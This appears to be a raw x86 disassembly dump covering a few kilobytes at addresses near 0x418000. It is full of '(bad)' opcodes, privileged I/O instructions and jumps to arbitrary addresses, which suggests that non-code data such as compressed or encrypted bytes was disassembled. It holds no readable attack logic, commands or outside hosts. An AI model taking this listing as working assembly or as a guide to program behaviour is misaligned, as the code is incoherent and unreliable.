  417d97:	mov    ds:0x57f1d8a,al
  417d9c:	(bad)  
  417d9d:	(bad)  
  417d9e:	retf   0x3f0b
  417da1:	(bad)  
  417da2:	es test al,0x79
  417da5:	xchg   esi,eax
  417da6:	loop   0x417d3c
  417da8:	cld    
  417da9:	pop    esi
  417daa:	es aaa 
  417dac:	cld    
  417dad:	in     eax,0xb8
  417daf:	pushf  
  417db0:	push   ebp
  417db1:	shl    al,cl
  417db3:	arpl   bp,di
  417db5:	xor    DWORD PTR [esp+eax*2],edi
  417db8:	inc    esp
  417db9:	dec    ebx
  417dba:	and    DWORD PTR [ecx],edi
  417dbc:	rcl    DWORD PTR [edx-0x74],1
  417dbf:	dec    edi
  417dc0:	jae    0x417d93
  417dc2:	mov    eax,0xa50ac133
  417dc7:	pop    ebp
  417dc8:	mov    ebp,?
  417dca:	xor    bh,al
  417dcc:	popa   
  417dcd:	out    0xac,eax
  417dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dd0:	pushf  
  417dd1:	push   ss
  417dd2:	jecxz  0x417d61
  417dd4:	mov    ds:0x6ea0bc50,eax
  417dd9:	inc    esp
  417dda:	jnp    0x417e47
  417ddc:	mov    ds:0xc975188b,al
  417de1:	mov    al,ds:0x74a4b9e0
  417de6:	out    dx,al
  417de7:	mov    esp,0x1d30c451
  417dec:	repz and al,0xd6
  417def:	gs pop edi
  417df1:	lods   eax,DWORD PTR ds:[esi]
  417df2:	(bad)  
  417df3:	aam    0x7e
  417df5:	mov    ecx,0xc49afcaf
  417dfa:	cmp    BYTE PTR [eax+0x3e1289b6],cl
  417e00:	cdq    
  417e01:	jne    0x417e37
  417e03:	push   esi
  417e04:	call   0x5eab38be
  417e09:	add    BYTE PTR [eax+0x144470b1],dh
  417e0f:	ins    BYTE PTR es:[edi],dx
  417e10:	and    bl,BYTE PTR [edx+0x40]
  417e13:	adc    ecx,ecx
  417e15:	jne    0x417e83
  417e17:	sbb    eax,0xd5faf7a8
  417e1c:	and    ebx,edi
  417e1e:	popa   
  417e1f:	add    BYTE PTR [eax+0x7c],0xcc
  417e23:	mov    ch,0x67
  417e25:	cdq    
  417e26:	sbb    esp,DWORD PTR [ebx+ecx*4]
  417e29:	add    eax,0x9c22c452
  417e2e:	clc    
  417e2f:	xlat   BYTE PTR ds:[ebx]
  417e30:	loopne 0x417e42
  417e32:	and    eax,DWORD PTR [eax+0x4fced8f3]
  417e38:	and    ah,ah
  417e3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e3b:	mov    edi,0xde3e1494
  417e40:	test   al,0x45
  417e42:	inc    ecx
  417e43:	fist   WORD PTR [eax-0x56]
  417e46:	pop    ss
  417e47:	jae    0x417de2
  417e49:	jns    0x417e9a
  417e4b:	pusha  
  417e4c:	xrelease mov DWORD PTR [edi+0x6a],ebx
  417e50:	ds mov ebp,0xafaf4013
  417e56:	add    eax,0xfc530343
  417e5b:	add    eax,0x923771ac
  417e60:	ja     0x417dff
  417e62:	jp     0x417e79
  417e64:	or     edx,esp
  417e66:	clc    
  417e67:	sbb    bl,BYTE PTR [edx+0x18]
  417e6a:	sti    
  417e6b:	dec    edx
  417e6c:	scas   al,BYTE PTR es:[edi]
  417e6d:	aad    0xd8
  417e6f:	push   esp
  417e70:	mov    edx,0xa6ca220a
  417e75:	push   ebx
  417e76:	cmp    ebx,DWORD PTR [eax-0x28]
  417e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e7a:	jno    0x417e5c
  417e7c:	sar    esp,1
  417e7e:	inc    esp
  417e7f:	int3   
  417e80:	and    al,ch
  417e82:	pop    edi
  417e83:	pushf  
  417e84:	fst    DWORD PTR [esi+0x2b]
  417e87:	arpl   WORD PTR [eax-0x2d],dx
  417e8a:	xor    BYTE PTR [edi],0x92
  417e8d:	mov    al,ds:0xb554d1fb
  417e92:	or     BYTE PTR [ebx],dh
  417e94:	inc    edi
  417e95:	cdq    
  417e96:	pop    cx
  417e98:	rcr    BYTE PTR [ebx-0xb],1
  417e9b:	xchg   edi,eax
  417e9c:	push   ds
  417e9d:	clc    
  417e9e:	inc    esp
  417e9f:	cli    
  417ea0:	and    eax,0x44728400
  417ea5:	sbb    eax,0xc54f1a9f
  417eaa:	mov    bl,0x69
  417eac:	cmp    bh,BYTE PTR [eax]
  417eae:	je     0x417f03
  417eb0:	int    0xf0
  417eb2:	cmp    eax,0x7e2c1118
  417eb7:	fisub  WORD PTR [edx-0x73]
  417eba:	or     esp,esi
  417ebc:	js     0x417e3f
  417ebe:	iret   
  417ebf:	cmc    
  417ec0:	and    BYTE PTR [esi-0x3ec70d08],ah
  417ec6:	loop   0x417f02
  417ec8:	pusha  
  417ec9:	xlat   BYTE PTR ds:[ebx]
  417eca:	jnp    0x417e5f
  417ecc:	pop    ecx
  417ecd:	mov    ds:0xef6c60fc,al
  417ed2:	das    
  417ed3:	sbb    dl,cl
  417ed5:	jmp    0x27cf2fc2
  417eda:	push   es
  417edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417edc:	or     eax,0x92c7e977
  417ee1:	push   0xffffff86
  417ee3:	sub    BYTE PTR [ebp+0x6f],ch
  417ee6:	ja     0x417ed7
  417ee8:	fwait
  417ee9:	loop   0x417efc
  417eeb:	pop    edi
  417eec:	xchg   edi,eax
  417eee:	repnz pop ebp
  417ef0:	out    0x37,al
  417ef2:	stos   DWORD PTR es:[edi],eax
  417ef3:	xor    eax,0xd24bbc51
  417ef8:	std    
  417ef9:	mov    cl,0xe0
  417efb:	push   0xffffffcb
  417efd:	push   cs
  417efe:	push   edi
  417eff:	(bad)  
  417f00:	xor    DWORD PTR [eax-0x38],ecx
  417f03:	dec    esp
  417f04:	gs aas 
  417f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f08:	popa   
  417f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f0a:	sar    ecx,0xce
  417f0d:	inc    ebx
  417f0e:	sub    dh,bh
  417f10:	mov    ds:0xc9b845b3,eax
  417f15:	jns    0x417f7f
  417f17:	mul    BYTE PTR [eax+ecx*1]
  417f1a:	outs   dx,BYTE PTR ds:[esi]
  417f1b:	iret   
  417f1c:	cli    
  417f1d:	lods   eax,DWORD PTR ds:[esi]
  417f1e:	sub    al,0xc0
  417f20:	mov    ds:0xb1406d88,al
  417f25:	enter  0x55f6,0x59
  417f29:	jns    0x417ef8
  417f2b:	pushf  
  417f2c:	mov    edx,0x1b3770cd
  417f31:	sbb    cl,dl
  417f33:	inc    ebp
  417f34:	xchg   edi,eax
  417f35:	mov    eax,ds:0x4facbb2
  417f3a:	aad    0x79
  417f3c:	xor    eax,0x263c748b
  417f41:	cld    
  417f42:	mov    ebx,0x2b91d94e
  417f47:	mov    dh,0x90
  417f49:	pop    ecx
  417f4a:	clc    
  417f4b:	call   0xfbbc870e
  417f50:	loopne 0x417f4e
  417f52:	and    BYTE PTR [edx-0x3541d2ff],ch
  417f58:	and    bh,BYTE PTR [ebx]
  417f5a:	fs ins BYTE PTR es:[edi],dx
  417f5c:	push   0xbb19c548
  417f61:	(bad)  
  417f62:	xchg   esp,eax
  417f63:	mov    ds:0xc172961b,eax
  417f68:	push   esi
  417f69:	bound  eax,QWORD PTR [edi-0x4b66eb69]
  417f6f:	or     al,0xdf
  417f71:	pop    esi
  417f72:	fwait
  417f73:	add    esp,ebp
  417f75:	sbb    edx,DWORD PTR gs:[edi+0x50240205]
  417f7c:	jmp    0xb762cd38
  417f81:	aas    
  417f82:	xor    esi,ebx
  417f84:	and    al,BYTE PTR [edi]
  417f86:	or     BYTE PTR [eax],0xa6
  417f89:	ret    
  417f8a:	mov    edi,0xd3b2251f
  417f8f:	xchg   esi,eax
  417f90:	jg     0x417fc8
  417f92:	jle    0x417fe2
  417f94:	test   BYTE PTR [esi+0x4416ea1b],ah
  417f9a:	mov    bl,0x73
  417f9c:	fxch   st(0)
  417f9e:	jecxz  0x417fff
  417fa0:	call   FWORD PTR [esi+eiz*4+0x6]
  417fa4:	mov    bh,0xe
  417fa6:	fild   QWORD PTR [ebx+0x60]
  417fa9:	mov    BYTE PTR [edx+0x53ae3897],ah
  417faf:	adc    bh,BYTE PTR [eax-0x2a3ce62]
  417fb5:	dec    ebp
  417fb6:	xor    ecx,ebx
  417fb8:	inc    ecx
  417fb9:	sahf   
  417fba:	popa   
  417fbb:	inc    edi
  417fbc:	jmp    0x47de1fc4
  417fc1:	pop    es
  417fc2:	xchg   BYTE PTR [eax+ecx*8],ch
  417fc5:	test   BYTE PTR gs:[edi],dh
  417fc8:	push   ecx
  417fc9:	dec    edi
  417fca:	clc    
  417fcb:	xchg   esi,eax
  417fcc:	pushaw 
  417fce:	or     ah,dh
  417fd0:	lock jle 0x41800e
  417fd3:	in     al,0x2
  417fd5:	xchg   ebp,eax
  417fd6:	dec    esp
  417fd7:	loope  0x417f69
  417fd9:	and    edi,ebp
  417fdb:	sub    ecx,edx
  417fdd:	push   eax
  417fde:	mov    bl,dh
  417fe0:	neg    DWORD PTR [ebx]
  417fe2:	cmp    ah,al
  417fe4:	(bad)  
  417fe5:	inc    ecx
  417fe7:	mov    edx,esi
  417fe9:	cmp    al,0x23
  417feb:	mov    eax,0x7d67b230
  417ff0:	dec    ebx
  417ff1:	xor    al,0x87
  417ff3:	loop   0x417f79
  417ff5:	ins    BYTE PTR es:[edi],dx
  417ff6:	sbb    bl,BYTE PTR ss:0xbcaae1cf
  417ffd:	stc    
  417ffe:	mov    ah,0x11
  418000:	adc    ch,BYTE PTR [ecx]
  418002:	inc    esp
  418003:	sub    edx,DWORD PTR [ebp+0x31]
  418006:	loope  0x418040
  418008:	jle    0x418064
  41800a:	fimul  DWORD PTR [ebx-0x3b888a15]
  418010:	jg     0x417ffe
  418012:	clc    
  418013:	icebp  
  418014:	dec    edi
  418015:	jae    0x417fb0
  418017:	adc    bl,BYTE PTR [edi+eiz*2-0x6a00bc2]
  41801e:	xor    bh,BYTE PTR [eax]
  418020:	out    0xff,eax
  418022:	sahf   
  418023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418024:	sbb    esp,edx
  418026:	test   al,0x7c
  418028:	push   0x4cbdfeaf
  41802d:	xchg   edx,eax
  41802e:	and    BYTE PTR [eax+0x7d],cl
  418031:	fisubr WORD PTR [edx]
  418033:	mov    bh,0xb8
  418035:	dec    esp
  418036:	and    DWORD PTR [eax],edx
  418038:	push   es
  418039:	push   0xffffff89
  41803b:	retf   
  41803c:	frstpm(287 only) 
  41803e:	mov    dl,0x91
  418040:	out    0x54,al
  418042:	daa    
  418043:	inc    esp
  418044:	lahf   
  418045:	jmp    0x5306bab3
  41804a:	push   eax
  41804b:	sub    al,0xd2
  41804d:	mul    BYTE PTR [eax+0x66]
  418050:	pop    eax
  418051:	or     DWORD PTR [edx-0x1c26a965],edx
  418057:	iret   
  418058:	icebp  
  418059:	pushf  
  41805a:	sbb    al,0x9d
  41805c:	inc    ecx
  41805d:	cmp    eax,0x7a8782a4
  418062:	cs inc ebp
  418064:	lahf   
  418065:	lods   al,BYTE PTR ds:[esi]
  418066:	(bad)  
  418067:	lock mov edi,DWORD PTR [ecx]
  41806a:	pop    eax
  41806b:	loope  0x418075
  41806d:	xchg   edi,ebx
  41806f:	leave  
  418070:	mov    eax,ds:0x9f6bb71a
  418075:	fisubr DWORD PTR [eax-0x2cf190ca]
  41807b:	fcomi  st,st(6)
  41807d:	nop
  41807e:	push   edi
  41807f:	sti    
  418080:	lods   eax,DWORD PTR ds:[esi]
  418081:	jnp    0x418024
  418083:	and    DWORD PTR [eax-0x11f64e0e],eax
  418089:	lods   eax,DWORD PTR ds:[esi]
  41808a:	sub    ah,BYTE PTR [edx+0x46]
  41808d:	js     0x418084
  41808f:	aad    0xdb
  418091:	adc    cl,0x92
  418094:	mov    bl,al
  418096:	pop    esp
  418097:	rol    BYTE PTR [ebp+0x6c],0x85
  41809b:	ror    BYTE PTR ds:0x385f38ab,cl
  4180a1:	mov    cl,0x7f
  4180a3:	dec    esi
  4180a4:	into   
  4180a5:	(bad)  
  4180a6:	sub    eax,0xd707af56
  4180ab:	push   ebp
  4180ac:	xchg   ebp,eax
  4180ad:	and    edi,DWORD PTR [edx+edi*4]
  4180b0:	pop    ebp
  4180b1:	mov    BYTE PTR [ecx+0x469a7afe],bh
  4180b7:	retf   
  4180b8:	into   
  4180b9:	mov    ds:0xafaba52a,eax
  4180be:	pop    ss
  4180bf:	push   cs
  4180c0:	pop    ebx
  4180c1:	xchg   esi,eax
  4180c2:	jmp    0xd8c0197d
  4180c7:	pop    edi
  4180c8:	xchg   edx,eax
  4180c9:	fld    QWORD PTR [ebx+ebx*2]
  4180cc:	ss xchg esp,eax
  4180ce:	cmp    edi,DWORD PTR [edi]
  4180d0:	outs   dx,DWORD PTR ds:[esi]
  4180d1:	or     eax,DWORD PTR [eax]
  4180d3:	scas   eax,DWORD PTR es:[edi]
  4180d4:	nop
  4180d5:	std    
  4180d6:	jb     0x418146
  4180d8:	in     al,0xa
  4180da:	cmp    DWORD PTR [edi+0x1691dd9a],ebx
  4180e0:	jo     0x41813a
  4180e2:	es inc eax
  4180e4:	loop   0x418164
  4180e6:	push   eax
  4180e7:	mov    eax,0x15460b34
  4180ec:	cmp    al,0xb2
  4180ee:	fwait
  4180ef:	loope  0x418141
  4180f1:	inc    ebx
  4180f2:	ins    DWORD PTR es:[edi],dx
  4180f3:	mov    BYTE PTR [esi-0x69e5240f],ch
  4180f9:	lods   eax,DWORD PTR ds:[esi]
  4180fa:	sub    eax,0x74a16f0
  4180ff:	(bad)  
  418100:	out    dx,al
  418101:	call   0xedaa:0x2dd3f228
  418108:	ss dec esi
  41810a:	sar    DWORD PTR [eax-0x69254fd0],cl
  418110:	fimul  DWORD PTR [edx-0x75]
  418113:	fmul   DWORD PTR [edi-0x63]
  418116:	icebp  
  418117:	nop
  418118:	dec    ebx
  418119:	adc    BYTE PTR [edi+0x6d],al
  41811c:	jmp    0x4180c4
  41811e:	ror    DWORD PTR [edx+0x4549eb97],cl
  418124:	test   DWORD PTR [esi-0xb],esp
  418127:	mov    ebp,0xcd5668cb
  41812c:	inc    esi
  41812d:	and    dh,BYTE PTR [esi-0x944b19d]
  418133:	xor    al,0x42
  418135:	dec    esi
  418136:	inc    ebx
  418137:	out    0x36,eax
  418139:	lahf   
  41813a:	fimul  WORD PTR [eax]
  41813c:	int    0x43
  41813e:	xchg   edx,eax
  41813f:	mov    ch,0x8c
  418141:	lea    edx,[ebx+0x12121d6c]
  418147:	inc    ebp
  418148:	pop    eax
  418149:	xchg   ebp,eax
  41814a:	xor    DWORD PTR [edi-0x1354cc37],eax
  418150:	es out 0x5c,al
  418153:	mov    ds:0xa28669a7,al
  418158:	mov    BYTE PTR [ecx+0x305bec86],al
  41815e:	loop   0x418154
  418160:	dec    edi
  418161:	icebp  
  418162:	or     DWORD PTR [ecx],0xc4c4b4b4
  418168:	not    BYTE PTR [eax+0x47]
  41816b:	retf   
  41816c:	jne    0x4181de
  41816e:	lock sub DWORD PTR [bx+di-0x6100],ebp
  418174:	(bad)  
  418175:	xchg   ecx,eax
  418176:	add    cl,BYTE PTR [ecx-0x453705fb]
  41817c:	data16 hlt 
  41817e:	jl     0x4181c2
  418180:	xor    eax,0x3fbac597
  418185:	mov    bl,0xe2
  418187:	das    
  418188:	cmp    BYTE PTR [ecx+0x47],0xa5
  41818c:	jae    0x4181bc
  41818e:	sbb    eax,DWORD PTR [ebp-0xb]
  418191:	cmp    DWORD PTR [eax-0x4c46a289],ecx
  418197:	mov    DWORD PTR [ecx-0x42e4128a],edi
  41819d:	bnd jg 0x418125
  4181a0:	pop    ebx
  4181a1:	jmp    esi
  4181a3:	mov    esp,DWORD PTR [ecx+0x774fba5d]
  4181a9:	sar    ch,1
  4181ab:	xchg   al,bh
  4181ad:	jg     0x4181f1
  4181af:	cli    
  4181b0:	(bad)  
  4181b1:	mov    cl,0x17
  4181b3:	jg     0x4181df
  4181b5:	mov    dh,0xb2
  4181b7:	cmp    ebp,DWORD PTR [esi+0x416547d9]
  4181bd:	add    BYTE PTR [edi],ch
  4181bf:	fisubr WORD PTR [ebp-0x552d0516]
  4181c5:	mov    esp,0xc8883353
  4181ca:	mov    BYTE PTR [ebp-0x6085ad09],ch
  4181d0:	xchg   ebp,eax
  4181d1:	rcr    DWORD PTR [esi],cl
  4181d3:	mov    ebp,0x49e21184
  4181d8:	clc    
  4181d9:	mov    eax,DWORD PTR [edi+esi*4+0x74]
  4181dd:	in     eax,0x27
  4181df:	scas   al,BYTE PTR es:[edi]
  4181e0:	gs loopne 0x4181ef
  4181e3:	adc    dl,dh
  4181e5:	dec    esi
  4181e6:	pop    esi
  4181e7:	xchg   ebp,eax
  4181e8:	xchg   esp,eax
  4181e9:	sub    dh,dh
  4181eb:	or     eax,0x917e3443
  4181f0:	pop    es
  4181f1:	xchg   ebp,eax
  4181f2:	cmp    eax,0x97d5e99c
  4181f7:	retf   
  4181f8:	fcmovnbe st,st(4)
  4181fa:	(bad)  
  4181fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181fc:	iret   
  4181fd:	(bad)  [edx+ebp*4]
  418200:	mov    esp,0x5f8780b5
  418205:	test   eax,0x648dcd61
  41820a:	or     DWORD PTR [ebx-0xf],esp
  41820d:	mov    WORD PTR [eax],ds
  41820f:	gs add ebx,ebp
  418212:	lahf   
  418213:	mov    ah,BYTE PTR [ebx+0x65]
  418216:	adc    DWORD PTR ds:0xa4b71520,esi
  41821c:	mov    edi,0xa1512c5c
  418221:	fmulp  st(4),st
  418223:	push   ss
  418224:	pop    esi
  418225:	ret    0x580f
  418228:	inc    ecx
  418229:	xor    al,0x8
  41822b:	mov    esi,0x4ee553e9
  418230:	mov    ds:0xc982f14b,al
  418235:	dec    eax
  418236:	jg     0x418247
  418238:	sbb    al,0x8
  41823a:	scas   eax,DWORD PTR es:[edi]
  41823b:	mov    DWORD PTR [esi],esi
  41823d:	ret    0x470
  418240:	sbb    al,0xca
  418242:	jp     0x418276
  418244:	inc    esi
  418245:	cli    
  418246:	push   es
  418247:	scas   eax,DWORD PTR es:[edi]
  418248:	fsub   DWORD PTR ds:0x6076859f
  41824f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418250:	mov    al,0xb9
  418252:	xor    eax,0x660e9bcf
  418257:	out    0x4a,al
  418259:	dec    eax
  41825a:	repz and ebp,DWORD PTR [ebx]
  41825d:	fisub  WORD PTR [ebx]
  41825f:	data16 jle 0x418204
  418262:	in     eax,0x73
  418264:	add    ebp,edx
  418266:	sti    
  418267:	fimul  WORD PTR [esi]
  418269:	out    0x73,al
  41826b:	add    eax,0xa46639a3
  418270:	xchg   ecx,eax
  418271:	mov    ds:0x5a76061a,eax
  418276:	mov    ecx,0x8ea15b29
  41827b:	inc    ebx
  41827c:	sub    BYTE PTR [edi+0x264721e7],al
  418282:	inc    ecx
  418283:	inc    edi
  418284:	sbb    eax,0x9d0dc98f
  418289:	jmp    0xc0497500
  41828e:	mov    ah,0x40
  418290:	pop    eax
  418291:	xchg   ebx,eax
  418292:	ins    BYTE PTR es:[edi],dx
  418293:	mov    ds:0x1b6c28aa,eax
  418298:	dec    esi
  418299:	sahf   
  41829a:	aam    0xe5
  41829c:	cld    
  41829d:	in     al,0x54
  41829f:	clc    
  4182a0:	aad    0xb8
  4182a2:	leave  
  4182a3:	outs   dx,DWORD PTR ds:[esi]
  4182a4:	fwait
  4182a5:	mov    ds:0x58c2ed1a,al
  4182aa:	les    esi,FWORD PTR [esi-0x5629e684]
  4182b0:	mov    ebp,0xb8882348
  4182b5:	loop   0x418315
  4182b7:	add    dh,BYTE PTR [edx-0x68]
  4182ba:	int    0x53
  4182bc:	(bad)  [esi]
  4182be:	out    dx,al
  4182bf:	mov    ds:0xc609f5cc,eax
  4182c4:	cld    
  4182c5:	adc    cl,0xc1
  4182c8:	daa    
  4182c9:	pop    ds
  4182ca:	and    bh,dh
  4182cc:	mov    edx,0xe003b7fe
  4182d1:	or     dh,BYTE PTR [esi+0x54b8c5b5]
  4182d7:	js     0x418275
  4182d9:	mov    dh,0xd3
  4182db:	mov    eax,0xf418fc72
  4182e0:	lea    ebp,[edi-0x17791e9d]
  4182e6:	lods   eax,DWORD PTR ds:[esi]
  4182e7:	add    al,0x82
  4182e9:	bound  esp,QWORD PTR [ebx+0x68]
  4182ec:	jae    0x4182b5
  4182ee:	xor    ebx,DWORD PTR [ebx+0x221f59f0]
  4182f4:	int3   
  4182f5:	adc    bh,bl
  4182f7:	(bad)  
  4182f8:	stos   DWORD PTR es:[edi],eax
  4182f9:	adc    ecx,DWORD PTR [edx]
  4182fb:	mov    eax,0x10c3050f
  418300:	int3   
  418301:	inc    eax
  418302:	cmovle edx,DWORD PTR [edx]
  418305:	dec    ecx
  418306:	adc    BYTE PTR [edx],0x75
  418309:	pop    edi
  41830a:	das    
  41830b:	lock nop
  41830d:	jno    0x443e7134
  418313:	call   0xd36e:0xb2ff9bfc
  41831a:	push   esi
  41831b:	retf   
  41831c:	jae    0x418327
  41831e:	xchg   ecx,eax
  41831f:	mov    DWORD PTR [edx-0x74b9ba01],0x16cdccc3
  418329:	pop    eax
  41832a:	or     eax,0xf796a08
  41832f:	xor    edi,esp
  418331:	push   0x904297e2
  418336:	jb     0x4182e8
  418338:	push   eax
  418339:	xor    DWORD PTR [ecx-0x20],eax
  41833c:	mov    ds:0x6916cef2,al
  418341:	(bad)  [eax+0x23]
  418344:	dec    edx
  418345:	mov    dh,BYTE PTR [eax-0x4c]
  418348:	ror    BYTE PTR ds:0x136e08d1,cl
  41834e:	cmc    
  41834f:	add    bl,BYTE PTR [ecx]
  418351:	test   DWORD PTR [eax+0x1b],eax
  418354:	in     eax,0x75
  418356:	inc    esp
  418357:	sub    eax,0x3a9bdad6
  41835c:	mov    ds:0x3a886915,al
  418361:	jmp    0xf02cbc1b
  418366:	pop    ebx
  418367:	(bad)  
  418368:	cmp    al,0x48
  41836a:	jae    0x4183d9
  41836c:	push   edx
  41836d:	lahf   
  41836e:	mov    DWORD PTR [ebp-0x55e7cae7],eax
  418374:	sub    esi,DWORD PTR [edx]
  418376:	jne    0x418306
  418378:	aas    
  418379:	dec    ecx
  41837a:	call   0xa079:0x5d4871f3
  418381:	xchg   edx,eax
  418382:	mov    ah,0xb4
  418384:	mov    eax,0x5f4f2684
  418389:	bound  eax,QWORD PTR [esi+0x69]
  41838c:	push   0xffffffdb
  41838e:	pop    ebx
  41838f:	sub    eax,DWORD PTR [esi]
  418391:	mov    ds:0x949bc0ee,eax
  418396:	inc    ebp
  418397:	lods   al,BYTE PTR ds:[esi]
  418398:	mov    eax,ds:0xcc4aacee
  41839d:	jge    0x4183ce
  41839f:	push   es
  4183a0:	sbb    DWORD PTR [edi],esp
  4183a2:	mov    ds:0x5e6e8173,eax
  4183a7:	pop    ecx
  4183a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183a9:	fwait
  4183aa:	jg     0x41837c
  4183ac:	ror    DWORD PTR [esi+0x774382ed],cl
  4183b2:	(bad)  
  4183b3:	jns    0x4183a7
  4183b5:	push   ss
  4183b6:	mov    dl,0x58
  4183b8:	push   es
  4183b9:	jne    0x41839e
  4183bb:	(bad)  [ebx+0x63]
  4183be:	ins    BYTE PTR es:[edi],dx
  4183bf:	mov    DWORD PTR [edi+0x7],edi
  4183c2:	xor    BYTE PTR [ebx],al
  4183c4:	push   edx
  4183c5:	aaa    
  4183c6:	xchg   bh,ch
  4183c8:	or     bh,ch
  4183ca:	lahf   
  4183cb:	inc    esp
  4183cc:	sar    BYTE PTR ds:0x772c05a2,0xd2
  4183d3:	arpl   WORD PTR [ebx],ax
  4183d5:	inc    ecx
  4183d6:	jmp    0xed783643
  4183db:	pop    eax
  4183dc:	xor    DWORD PTR [edx+0xf13d66d],0x8a0531fe
  4183e6:	cmp    BYTE PTR [esi-0x82da08c],bl
  4183ec:	lods   eax,DWORD PTR ds:[esi]
  4183ed:	adc    DWORD PTR [ebx-0x2ef9d898],esp
  4183f3:	dec    ebx
  4183f4:	adc    bh,bh
  4183f6:	mov    eax,DWORD PTR [ebp-0x3131aaac]
  4183fc:	(bad)  
  4183fd:	pop    edi
  4183fe:	aaa    
  4183ff:	mov    esi,0x9024d45b
  418404:	push   es
  418405:	sbb    eax,0xbc39e388
  41840a:	ret    
  41840b:	icebp  
  41840c:	xchg   esi,eax
  41840d:	scas   eax,DWORD PTR es:[edi]
  41840e:	out    0xe,eax
  418410:	pop    edx
  418411:	xchg   esp,eax
  418412:	xchg   ebx,eax
  418413:	out    0x37,al
  418415:	cmp    BYTE PTR [eax+edx*1-0x11],cl
  418419:	xor    BYTE PTR [edi-0x7b2f3bcc],al
  41841f:	fld    DWORD PTR [ebx+0x3360b787]
  418425:	outs   dx,DWORD PTR ds:[esi]
  418426:	mov    BYTE PTR [edx],bl
  418428:	outs   dx,DWORD PTR ds:[esi]
  418429:	cwde   
  41842a:	adc    dl,BYTE PTR ds:0xdaf2071
  418430:	xchg   BYTE PTR [edx+ebp*8-0x11],bh
  418434:	lahf   
  418435:	mov    BYTE PTR [ebp-0x73],dh
  418438:	(bad)  
  418439:	and    esp,DWORD PTR [eax+ecx*1]
  41843c:	mov    edx,0x596576ad
  418441:	xchg   ecx,eax
  418442:	adc    ebp,edx
  418444:	push   ebx
  418445:	jmp    0x4a9c5449
  41844a:	fcomp  QWORD PTR [ebx+esi*2-0x3e]
  41844e:	cmp    bh,BYTE PTR [ecx-0x3e4f136d]
  418454:	xchg   DWORD PTR ds:0xe49e25f0,esi
  41845a:	in     al,dx
  41845b:	gs call 0x85c499a1
  418461:	sub    cl,BYTE PTR [eax-0x54c2db06]
  418467:	shl    BYTE PTR [edx-0x43],0x49
  41846b:	dec    ebx
  41846c:	add    BYTE PTR [ecx],dl
  41846e:	sub    eax,0xe9655789
  418473:	sub    BYTE PTR [eax-0x417b63ec],ch
  418479:	sbb    esp,DWORD PTR [edx+eax*4-0x17]
  41847d:	inc    eax
  41847e:	aaa    
  41847f:	push   ss
  418480:	xchg   BYTE PTR [edx-0x37d60749],bh
  418486:	fbstp  TBYTE PTR [edx-0x1b1301ae]
  41848c:	mov    al,0xd5
  41848e:	adc    ah,BYTE PTR [ebx]
  418490:	test   ecx,edi
  418492:	push   0x59adc9a6
  418497:	ret    0x7adf
  41849a:	xchg   edx,eax
  41849b:	ins    DWORD PTR es:[edi],dx
  41849c:	fwait
  41849d:	inc    edx
  41849e:	sbb    esp,DWORD PTR [eax]
  4184a0:	ret    0x2f0d
  4184a3:	shl    DWORD PTR [edx-0x46],cl
  4184a6:	inc    edi
  4184a7:	cmp    eax,0x4163b008
  4184ac:	lahf   
  4184ad:	jb     0x418433
  4184af:	retf   0x8a5a
  4184b2:	(bad)  
  4184b3:	std    
  4184b4:	jbe    0x4184ac
  4184b6:	arpl   WORD PTR [ebx+0x38],bx
  4184b9:	or     ah,BYTE PTR [ebx]
  4184bb:	or     eax,0x1c4d45df
  4184c0:	xchg   edi,eax
  4184c1:	xchg   esi,eax
  4184c2:	push   ebx
  4184c3:	jne    0x418488
  4184c5:	mov    esp,0xbf0bb09e
  4184ca:	pop    ss
  4184cb:	push   edi
  4184cc:	inc    edx
  4184cd:	(bad)  
  4184cf:	pop    ss
  4184d0:	int3   
  4184d1:	shr    ch,1
  4184d3:	sub    eax,0x9a1870b3
  4184d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184d9:	adc    eax,0xfea408eb
  4184de:	scas   eax,DWORD PTR es:[edi]
  4184df:	(bad)  [edi+0x1c]
  4184e2:	es push ds
  4184e4:	xor    al,0x86
  4184e6:	push   ecx
  4184e7:	cmp    BYTE PTR [edx],dh
  4184e9:	lock ret 
  4184eb:	(bad)  
  4184ec:	jmp    0xf2a3:0x572df6cc
  4184f3:	mov    ds:0xdaf03ab2,al
  4184f8:	mov    al,ds:0x7f46d92e
  4184fd:	pusha  
  4184fe:	add    eax,0xfde56c01
  418503:	mov    bl,0xa8
  418505:	cmc    
  418506:	dec    edx
  418507:	pop    esi
  418508:	(bad)  
  418509:	daa    
  41850a:	retf   0x1312
  41850d:	lds    ebx,FWORD PTR ds:0x388e6d34
  418513:	and    eax,0x1c226224
  418518:	cmp    BYTE PTR [ecx],0x78
  41851b:	shr    DWORD PTR [esi],1
  41851d:	mov    al,ds:0x8147a7be
  418522:	adc    bl,BYTE PTR [esi+0x73]
  418525:	pusha  
  418526:	loope  0x41852d
  418528:	xchg   ebp,eax
  418529:	push   esi
  41852a:	ret    0xe16e
  41852d:	mov    ebp,0x11fadc3a
  418532:	scas   eax,DWORD PTR es:[edi]
  418533:	daa    
  418534:	(bad)  
  418535:	xchg   ebp,eax
  418536:	add    BYTE PTR [esi+0x43137eae],bh
  41853c:	retf   0x40f8
  41853f:	lods   eax,DWORD PTR ds:[esi]
  418540:	(bad)  
  418541:	ins    DWORD PTR es:[edi],dx
  418542:	pop    eax
  418543:	jno    0x418510
  418545:	aad    0x33
  418547:	ret    
  418548:	jge    0x4185aa
  41854a:	push   edx
  41854b:	popa   
  41854c:	fcomp  DWORD PTR [edi+ebx*4-0x158c9e57]
  418553:	mov    ds:0x7eae94cd,eax
  418558:	adc    al,0xd
  41855a:	lock (bad) 
  41855c:	fist   DWORD PTR [ecx-0x779fa739]
  418562:	mov    esp,0xce15a0af
  418567:	sub    bl,BYTE PTR [eax]
  418569:	ja     0x418538
  41856b:	pop    ecx
  41856c:	ret    0x8040
  41856f:	jmp    0x53d97a3b
